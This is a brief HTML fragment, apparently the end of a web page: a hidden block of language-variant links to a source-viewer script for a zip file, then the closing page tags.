<div style="display: none;"><a href="/src_view.php?lang=de&amp;file=100.zip">de</a><a href="/src_view.php?lang=en&amp;file=100.zip">en</a><a href="/src_view.php?lang=es&amp;file=100.zip">es</a><a href="/src_view.php?lang=it&amp;file=100.zip">it</a><a href="/src_view.php?lang=fr&amp;file=100.zip">fr</a><a href="/src_view.php?lang=pl&amp;file=100.zip">pl</a><a href="/src_view.php?lang=ru&amp;file=100.zip">ru</a><a href="/src_view.php?lang=ua&amp;file=100.zip">ua</a></div>
</body>
</html>
